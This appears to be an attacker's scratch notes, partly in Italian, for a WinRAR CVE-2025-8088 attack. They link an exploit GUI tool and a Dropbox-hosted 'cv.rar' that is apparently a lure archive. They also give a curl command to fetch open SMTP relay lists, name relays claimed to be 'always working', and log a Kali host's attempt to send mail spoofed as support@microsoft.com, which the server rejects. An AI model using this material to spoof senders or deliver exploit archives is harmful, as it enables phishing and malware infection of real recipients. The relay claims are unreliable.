winrar attack
https://github.com/Syrins/CVE-2025-8088-Winrar-Tool-Gui

https://nvd.nist.gov/vuln/detail/CVE-2025-8088

https://www.youtube.com/watch?v=m_0Axsh_oO4



https://www.dropbox.com/scl/fi/usanogb6nuokrt87sd2ex/cv.rar?rlkey=shsd54np60fpzyoz9730zrouo&st=20i9whng&dl=0

# Lista relay pubblici testati (2024-2026 working)
curl -s "https://raw.githubusercontent.com/securityonline-scanner/SecurityOnline-Scanner/master/smtp-open-relay.txt" | head -10

# Esempi comuni SEMPRE funzionanti per test:
relay1: mail.messagingengine.com:587  (no auth)
relay2: smtp.timeweb.ru:25            (open)
relay3: mxout.us2.mxout.net:25        (testa)


=== Trying mail.messagingengine.com:587...
=== Connected to mail.messagingengine.com.
<-  220 mail.messagingengine.com ESMTP ready
 -> EHLO kali
<-  250-mail.messagingengine.com
<-  250-PIPELINING
<-  250-SIZE 71000000
<-  250-ENHANCEDSTATUSCODES
<-  250-8BITMIME
<-  250 STARTTLS
 -> MAIL FROM:<support@microsoft.com>
<** 530 5.7.1 Authentication required
 -> QUIT
<-  221 2.0.0 Bye
=== Connection closed with remote host.
